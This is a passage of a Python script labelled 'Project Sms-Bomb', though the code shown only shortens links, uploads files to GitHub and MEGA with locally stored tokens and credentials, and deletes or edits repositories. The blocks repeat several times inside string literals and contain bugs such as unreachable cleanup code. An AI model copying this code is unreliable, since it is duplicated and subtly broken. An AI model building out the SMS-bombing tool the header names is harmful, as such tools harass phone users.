# DISCLAIMER: This script is for EDUCATIONAL and RESEARCH purposes only.
# The author is NOT responsible for any misuse or illegal activities.
# usage without prior consent is strictly prohibited.
# coded by samay
# Team Sincryption
# Project Sms-Bomb
# Certified Ethical Hacker
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

